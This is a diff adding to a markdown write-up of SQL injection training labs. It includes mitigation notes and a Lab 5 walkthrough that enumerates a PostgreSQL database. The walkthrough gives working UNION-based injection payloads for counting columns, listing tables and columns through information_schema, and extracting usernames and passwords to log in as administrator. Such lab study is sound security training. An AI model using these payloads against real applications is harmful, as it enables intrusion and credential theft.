@@ -37,6 +37,16 @@ The final injected request looked like:
 
 ```
 
+### Mitigation
+
+ - Parameterized queries (prepared statements)
+
+ - Avoid dynamic SQL
+
+ - Principle of least privilege
+
+ - Restrict database metadata exposure
+
 ## Lab 2 – SQL injection allowing login bypass
 
 ###  Goal
@@ -173,5 +183,101 @@ filter?category=Gifts' UNION SELECT (SELECT @@version),2%23
  - URL encoding is often required for GET parameters
 
  - Comment characters may behave differently depending on the DBMS
+
+
+## Lab 5 – Listing database contents (non-Oracle databases)
+
+### Lab Info
+This lab contains a SQL injection vulnerability in the product category filter.  
+Query results are reflected in the response, which allows a UNION-based attack to retrieve data from other tables.
+
+The application includes a login system, and the database stores usernames and passwords in a table.  
+The objective is to identify this table and extract user credentials.
+
+### Goal
+Log in as the administrator user.
+
+
+### Step 1 – Determine the number of columns
+To use the UNION operator, both queries must return the same number of columns.
+I used the ORDER BY technique:
+
+```sql
+ORDER BY 1
+ORDER BY 2
+ORDER BY 3
+```
+
+The query failed at index 3, indicating that the original query contains 2 columns.
+
+### Step 2 – Identify reflected columns
+To determine which columns accept string output, I tested with:
+
+```sql
+UNION SELECT NULL, NULL--
+```
+
+Both columns were reflected in the response, so either column could be used to inject data.
+
+### Step 3 – Identify the database type
+To understand which DBMS was in use, I tested common database functions.
+
+```sql
+UNION SELECT current_database(), 'test'--
+```
+
+This revealed that the application uses PostgreSQL.
+
+### Step 4 – Enumerate table names
+In PostgreSQL, table names can be retrieved from the information schema:
+
+```sql
+UNION SELECT table_name, 'a'
+FROM information_schema.tables
+WHERE table_schema = 'public'--
+```
+
+Filtering by table_schema = 'public' helps remove system tables.
+
+I identified an interesting table:
+
+```
+users_duvcuz
+```
+
+### Step 5 – Enumerate column names
+To list the columns of that table:
+
+```sql
+UNION SELECT column_name, 'a'
+FROM information_schema.columns
+WHERE table_name = 'users_duvcuz'--
+```
+
+Relevant columns:
+
+ - username_ajmznc
+
+ - password_sgqraj
+
+### Step 6 – Extract credentials
+Since both columns reflect output, I extracted usernames and passwords:
+
+```sql
+UNION SELECT username_ajmznc, password_sgqraj
+FROM users_duvcuz--
+```
+### Result
+Successfully retrieved user credentials and logged in as the administrator.
+
+### Mitigation
+
+ - Parameterized queries (prepared statements)
+
+ - Avoid dynamic SQL
+
+ - Principle of least privilege
+
+ - Restrict database metadata exposure
 
 
